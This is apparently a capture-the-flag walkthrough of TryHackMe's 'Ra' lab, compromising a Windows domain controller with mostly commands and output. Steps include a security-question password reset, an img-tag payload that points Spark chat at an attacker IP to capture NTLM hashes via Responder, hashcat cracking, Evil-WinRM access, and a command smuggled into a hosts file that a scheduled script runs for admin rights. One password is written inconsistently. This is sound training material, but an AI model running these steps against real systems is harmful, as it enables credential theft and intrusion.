---
published: true
title: Ra - TryHackMe Walkthrough
category: Writeup
author: F3dai
image: 'https://imgur.com/rPkq5FM.png'
---
Ra - "You have found WindCorp's internal network and their Domain Controller. Can you pwn their network?" This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/). 

**URL:** [Ra](https://tryhackme.com/room/ra)

**Difficulty:** Hard

**Author:** 4ndr34zz

We are given the IP 10.10.51.76, add it to /etc/hosts and run a portscan:

<pre>nmap -p- -A ra.thm -o portscan</pre>

<pre>PORT      STATE SERVICE             VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http                Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|_  Product_Version: 10.0.17763
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Not valid before: 2020-04-30T14:41:03
|_Not valid after:  2020-06-30T14:41:02
|_ssl-date: 2020-07-28T13:43:48+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2020-07-28T13:43:05+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2020-04-30T06:40:02
|_Not valid after:  2020-10-30T06:40:02
|_ssl-date: 2020-07-28T13:43:47+00:00; -1s from scanner time.
5222/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
| 
|     stream_id: 915zwyjswx
|     auth_mechanisms: 
| 
|     xmpp: 
|       version: 1.0
|     features: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
| 
|_    compression_methods: 
5223/tcp  open  ssl/hpvirtgrp?
5229/tcp  open  jaxflow?
5262/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     unknown: 
| 
|     stream_id: 4vx13wz4gf
|     auth_mechanisms: 
| 
|     xmpp: 
|       version: 1.0
|     features: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
| 
|_    compression_methods: 
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   Respects server name
|   STARTTLS Failed
|   info: 
|     unknown: 
| 
|     stream_id: 345hqjca3g
|     auth_mechanisms: 
| 
|     xmpp: 
|       version: 1.0
|     features: 
| 
|     errors: 
|       host-unknown
|       (timeout)
|     capabilities: 
| 
|_    compression_methods: 
5270/tcp  open  ssl/xmp?
5276/tcp  open  ssl/unknown
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp  open  http                Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 28 Jul 2020 13:40:53 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     &lt;html&gt;
|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;
|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 28 Jul 2020 13:41:00 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x1&lt;/pre&gt;
9091/tcp  open  ssl/xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 28 Jul 2020 13:41:12 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     &lt;html&gt;
|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;
|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 28 Jul 2020 13:41:12 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
9389/tcp  open  mc-nmf              .NET Message Framing
49669/tcp open  msrpc               Microsoft Windows RPC
49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc               Microsoft Windows RPC
49676/tcp open  msrpc               Microsoft Windows RPC
49744/tcp open  msrpc               Microsoft Windows RPC
49910/tcp open  msrpc               Microsoft Windows RPC</pre>

A lot of ports open, let's start with port 80:

<pre>http://ra.thm/</pre>

![PORT 80](https://imgur.com/pnv9Vt3.png)

I found something interesting when analysing the web request for this site. I used the inspect element function of my browser and went to "network" (Firefox) to see if there was anything interesting when I entered a search query on the company portal.

Here is what I saw:

![web request](https://imgur.com/9LvceTn.png)

There seem to not a bunch of GET requests from "fire.windcorp.thm:9090" for images to display icons for "Our IT support-staff". We can also see all the associated users to these. I will note these down in a .txt file. 

- organicfish718@fire.windcorp.thm
- organicwolf509@fire.windcorp.thm
- tinywolf424@fire.windcorp.thm
- angrybird253@fire.windcorp.thm
- buse@fire.windcorp.thm
- Edeltraut@fire.windcorp.thm
- happymeercat399@fire.windcorp.thm
- orangegorilla428@fire.windcorp.thm
- Edward@fire.windcorp.thm
- Emile@fire.windcorp.thm
- tinygoose102@fire.windcorp.thm
- brownostrich284@fire.windcorp.thm
- sadswan869@fire.windcorp.thm
- goldencat416@fire.windcorp.thm
- whiteleopard529@fire.windcorp.thm

Let's add this domain to our hosts file:

<pre>sudo nano /etc/hosts</pre>

Add fire.windcorp.thm to the file:

![hosts file](https://imgur.com/1BeiaJG.png)

Let's visit this new domain:

<pre>http://fire.windcorp.thm:9090</pre>

![new domain](https://imgur.com/SfuKDIs.png)

We have a login page for openfire. We can identify it is running Openfire, Version: 4.5.1 however, I couldn't find any obvious vulnerabilities. 

I also wanted to play around with the "forgotten password" function. 

We have a few options about a security question, one of which is asking about a pet.

![reset password](https://imgur.com/14hU6gp.png)

Under "Our Employees", there is a woman named Lily Levesque who is with a dog. 

![dog](https://imgur.com/Rj3AkoI.png)

I also remember seeing her image when inspecting the web requests - here is the file name:

![file name](https://imgur.com/li2OA9H.png)

<pre>lilyleAndSparky.jpg</pre>

It looks like her username could be lilyle and her dog is named Sparky.

![Reset](https://imgur.com/QPPvsox.png)

We are able to reset her password to *ChangeMe#1234*. 

This is a great example of how far enumeration can go when collecting information about your target(s). You can imagine how effective Social Enginnering could be in situations like this as well.

These credentials did not work for the openfire service so I started to look for other services from our portscan. 

We can see active directory (ldap) on port 389. Let's try and use these credentials to view the possible shares on this system.

<pre>┌─[user@parrot]─[~/tryhackme/Ra]
└──╼ $smbmap -u lilyle -p ChangeMe#1234 -H ra.thm
[+] IP: ra.thm:445..    Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	</pre>
	
Have a look at the "Shared" directory:

<pre>┌─[✗]─[user@parrot]─[~/tryhackme/Ra]
└──╼ $smbclient //ra.thm/Shared -U lilyle --password ChangeMe#1234
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 30 01:45:42 2020
  ..                                  D        0  Sat May 30 01:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 16:32:36 2020
  spark_2_8_3.deb                     A 29526628  Sat May 30 01:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 12:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 12:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 12:07:24 2020

		15587583 blocks of size 4096. 10897965 blocks available</pre>

We have our first flag and some files "spark". I also saw that a port for jabber was open so these files are interesting. Download the spark package:

<pre>GET spark_2_8_3.deb
sudo dpkg -i spark_2_8_3.deb
spark</pre>

Now we have spark running on our local machine, we can try and use the credentials we found to log in to her account. 

Make sure you check "Accept all certificates" and "Disable hostname verification" on advanced options.

![spark](https://imgur.com/itsxUhS.png)

We are logged in:

![spark authenticated](https://imgur.com/8iZuNk0.png)

Since we are an authenticated user on spark, I straight away searched up exploits for spark. 

I came across this interesting article on Github:

[CVE-2020-12772 - Github](https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md)

Sending the following &lt;img&gt; would essentially reveal the NTML hashes of the user that visits the link. 

<pre>&lt;img src=[external_ip]/test.img&gt;</pre>

It looks like the user Buse is online:

![Buse online](https://imgur.com/kvVFi00.png)

His username is buse@fire.windcorp.thm so start a chat with him. We will be using Responder to listen for the NTLM hash. Please note, you will need to stop other services running to allow for responder to work (I had to close my SSH port for this to work).

<pre>sudo Responder -I tun0</pre>

Or, download the newest version from github:

<pre>git clone https://github.com/lgandx/Responder.git
cd Responder
sudo python3 Responder.py -I tun0</pre>

Now we can send the &lt;img&gt; tag to Buse:

<pre>&lt;img src=&quot;http://10.9.6.63/fedai.jpg&quot;&gt;</pre>

We got a hit!

![Responder hash](https://imgur.com/KztkX0C.png)

<pre>[+] Listening for events...
[HTTP] Sending NTLM authentication request to 10.10.97.155
[HTTP] GET request from: 10.10.97.155     URL: /fedai.jpg 
[HTTP] Host             : 10.9.6.63 
[HTTP] NTLMv2 Client   : 10.10.97.155
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:438ba8a6154108d5:84D16DD38C8DD23952D518A3FDEB2F04:0101000000000000D27CA1B08F65D601928E5FABDAFA236E000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000001000000002000004962BEBF4B0492439D94E13699F51104AE7010E99EBF72263C47ACBD91DA470D0A00100000000000000000000000000000000000090000000000000000000000
</pre>

I will now use hashcat to crack this NTLM hash. I will put this hash into a .txt file and use mode 1000 on hashcat to brute.

<pre>┌─[✗]─[user@parrot]─[~/tryhackme/Ra]
└──╼ $hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.0.0) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-6500 CPU @ 3.20GHz, 2890/2954 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BUSE::WINDCORP:8b11ab5cf6e9e098:222f76790a6fa3f4f6b22215dc4b32d3:01010000000000005672c2b08f65d601ed6cc48244ccb53c000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c0008003000300000000000000001000000002000004962bebf4b0492439d94e13699f51104ae7010e99ebf72263c47acbd91da470d0a00100000000000000000000000000000000000090000000000000000000000:u*********1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: BUSE::WINDCORP:8b11ab5cf6e9e098:222f76790a6fa3f4f6b...000000
Time.Started.....: Wed Jul 29 11:11:02 2020 (3 secs)
Time.Estimated...: Wed Jul 29 11:11:05 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   953.9 kH/s (1.94ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2961408/14344385 (20.65%)
Rejected.........: 0/2961408 (0.00%)
Restore.Point....: 2957312/14344385 (20.62%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: v10014318 -> utrox11

Started: Wed Jul 29 11:10:30 2020
Stopped: Wed Jul 29 11:11:07 2020</pre>

Since port 5985 is open, we can use Evil-WinRM to access the users account now that we have his credentials.

<pre>┌─[user@parrot]─[~/tryhackme/Ra]
└──╼ $cat portscan | grep 5985
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</pre>

Here is the repo for Evil-WinRM:

[Evil-WinRM - Github](https://github.com/Hackplayers/evil-winrm)

<pre>┌─[✗]─[user@parrot]─[~/Tools/evil-winrm]
└──╼ $ruby evil-winrm.rb -i ra.thm -u buse -p u*********1

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\buse\Documents> whoami
windcorp\buse</pre>

Enumerate a bit, you will come across the "scripts" directory:

<pre>*Evil-WinRM* PS C:\> dir scripts


    Directory: C:\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/3/2020   5:53 AM           4119 checkservers.ps1
-a----        7/29/2020   3:36 AM             31 log.txt</pre>

log.txt gives a time of when "checkservers.ps1" was last run. This suggests that the .ps1 file is run quite often. Read through the script:

<pre># Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |</pre>

It looks like it is reading the hosts file of brittanycr\hosts.txt.

Unfortunaly, we do not have access to view her files.

Let's check what groups there are and what we are a part of;

<pre>*Evil-WinRM* PS C:\Users\brittanycr> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</pre>

Refer to this article to understand the different groups:

[Active Directory Securtiy Groups - Microsoft Docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups)

[Account Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators) group grants limited account creation privileges to a user. This can essentially create and manage users and groups in the domain, including its own membership and that of the Server Operators group.

So, let's change the password for brittanycr's account. Please note, the password must meet password policy requirements.

Here is the AD password policy:

![Password policy](https://imgur.com/Q7OSbmI.png)

<pre>*Evil-WinRM* PS C:\Users\brittanycr> net user /domain brittanycr CyberGoat1234
The command completed successfully.</pre>

I actually tried to make a new user and add them to the Administrator group but I was denied access despite being an Account operator.

I continued down the brittanycr route and access her share with the following command:

<pre>┌─[✗]─[user@parrot]─[~/tryhackme/Ra]
└──╼ $smbclient \\\\ra.thm\\Users -U brittanycr
Enter WORKGROUP\brittanycr's password: CyberGoat1234</pre>

We can access the hosts.txt file now as we are authenticated as brittanycr.

<pre>GET hosts.txt</pre>

This is what the file contains:

<pre>┌─[user@parrot]─[~/tryhackme/Ra]
└──╼ $cat hosts.txt 
google.com
cisco.com</pre>

Since we couldn't add a user to the Administrator group earlier, maybe we can do this by using the hosts.txt.

I created a user called "ghandi" with the following command:

<pre>*Evil-WinRM* PS C:\Users\buse\Documents> net user ghandi CyberGoat1234 /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\buse\Documents> net localgroup Administrators ghandi /add
net.exe : System error 5 has occurred.
    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

Access is denied.</pre>

As you can see, access is denied with trying to add ghandi to the Admin group. Let's add that command to our hosts.txt and put it in the system for it to hopefully be executed.

<pre>┌─[user@parrot]─[~/tryhackme/Ra]
└──╼ $cat hosts.txt 
google.com 
notadomain.ru; net localgroup Administrators ghandi /add</pre>

<pre>put hosts.txt</pre>

![put hosts](https://imgur.com/7K6ySis.png)

Now we can attempt to log in as ghandi:

<pre>evil-winrm -i ra.thm -u ghandi -p CyberGoat12345</pre>

![ghandi evilwin](https://imgur.com/oMsdqfP.png)

We're logged in as ghandi!

We gave ourselves admin rights so the rest is to find the last flag.

![flag3.txt](https://imgur.com/1z5WyYq.png)

Thank you for reading.

![ghandi](https://imgur.com/65P2i74.png)



